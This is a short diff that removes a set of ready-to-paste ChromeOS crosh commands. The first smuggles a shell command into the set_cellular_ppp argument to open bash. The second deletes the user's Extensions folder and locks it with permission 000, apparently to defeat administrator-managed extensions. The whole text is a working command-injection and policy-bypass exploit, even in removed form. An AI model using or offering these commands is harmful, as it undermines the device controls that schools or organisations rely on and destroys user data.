@@ -1,5 +1,0 @@
-Paste these into crosh with ctrl+shift+v:
-
-set_cellular_ppp \';bash;exit;\'
-
-chmod 777 ~/Extensions;rm -rf ~/Extensions;mkdir ~/Extensions;chmod 000 ~/Extensions
